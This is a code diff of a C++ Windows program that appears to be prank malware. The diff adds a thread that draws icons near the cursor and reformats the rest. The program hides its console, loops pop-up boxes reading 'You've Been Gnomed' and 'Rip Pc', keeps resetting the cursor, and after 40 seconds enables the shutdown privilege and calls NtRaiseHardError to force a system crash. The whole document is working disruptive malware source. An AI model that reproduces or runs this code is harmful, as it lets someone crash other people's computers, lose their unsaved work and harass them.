@@ -13,33 +13,57 @@ EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
 	BOOLEAN  Enable,
 	BOOLEAN  CurrentThread,
 	PBOOLEAN Enabled
-	);
+);
 
-EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, 
-	ULONG NumberOfParameters, 
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus,
+	ULONG NumberOfParameters,
 	PULONG UnicodeStringParameterMask,
-	PULONG_PTR Parameters, 
-	ULONG ValidResponseOption, 
+	PULONG_PTR Parameters,
+	ULONG ValidResponseOption,
 	PULONG Response
-	);
+);
 
 void WarpCursor() {
-POINT cursor;
+	POINT cursor;
 	while (true) {
-	GetCursorPos(&cursor);
-	Sleep(1'000);
-	SetCursorPos(cursor.x ,cursor.y);
+		GetCursorPos(&cursor);
+		Sleep(5'000);
+		SetCursorPos(cursor.x, cursor.y);
 	}
 }
 
+void DrawIconsCursor()
+{
+	POINT cursor;
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	while (true)
+	{
+		int random = rand() % 3;
+		GetCursorPos(&cursor);
+		Sleep(100);
+		if (random == 1) {
+			DrawIcon(hdc, (cursor.x) + 200, (cursor.y) + 80, LoadIcon(NULL, IDI_ERROR));
+		}
+		else if (random == 2) {
+			Sleep(7);
+			DrawIcon(hdc, (cursor.x) + 250, (cursor.y) + 40, LoadIcon(NULL, IDI_WARNING));
+		}
+		else {
+			Sleep(7);
+			DrawIcon(hdc, (cursor.x) + 150, (cursor.y) + 10, LoadIcon(NULL, IDI_QUESTION));
+		}
+	}
+}
 
 void payload() {
-	while(true) {
+	while (true) {
 		MessageBoxA(0, "You'e Been Gnomed", "You've Been Gnomed", MB_TOPMOST | MB_ABORTRETRYIGNORE);
-		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);	
+		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);
 		MessageBeep(MB_ICONINFORMATION);
 	}
 }
+
 
 int main() {
 	BOOLEAN bl;
@@ -47,16 +71,17 @@ int main() {
 	unsigned long response;
 
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	
-	std::thread t1 (payload);
+	std::thread t1(payload);
 	std::thread t2(WarpCursor);
+	std::thread t3(DrawIconsCursor);
 
 	Sleep(40'000);
-		RtlAdjustPrivilege(19, true, false, &bl);
-		MessageBeep(MB_ICONINFORMATION);
-		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+	RtlAdjustPrivilege(19, true, false, &bl);
+	MessageBeep(MB_ICONINFORMATION);
+	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
 
 	t1.join();
 	t2.join();
+	t3.join();
 	return 0;
 }
